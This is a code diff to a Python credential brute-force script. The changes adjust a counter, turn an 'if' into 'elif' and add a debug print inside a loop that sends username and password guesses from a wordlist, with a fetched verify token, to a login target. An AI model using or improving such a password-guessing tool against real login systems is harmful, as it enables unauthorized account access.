@@ -36,7 +36,7 @@ def bruteforce(filename):
     error_response = requests.get(target_url).content 
     with requests.Session() as session:
         while True:
-            count = 0
+            count = 1
             for username in credentials_list:
                 for i in range(0, creds_count):
                     payload = {'RequestVerifyToken': _getVerifyToken_(), 'act': username.strip(), 'pwd': credentials_list[i].strip()}
@@ -50,7 +50,7 @@ def bruteforce(filename):
                         print(f" Took : {end - begin} seconds")
                         credentials_file.close()
                         sys.exit(0)
-                    if count == creds_count:
+                    elif count == creds_count:
                         print(" No Credentials Found !!")
                         print(Fore.RED + f" Tested {creds_count} credentials") 
                         print(" Try a different wordlist :) ")
@@ -58,8 +58,9 @@ def bruteforce(filename):
                         print(f" Took : {end - begin} seconds")
                         credentials_file.close()
                         sys.exit(0)
-            
+                    print(f"count {count} , creds_count {creds_count}")
                 count += 1
+        
         
     credentials_file.close()
 
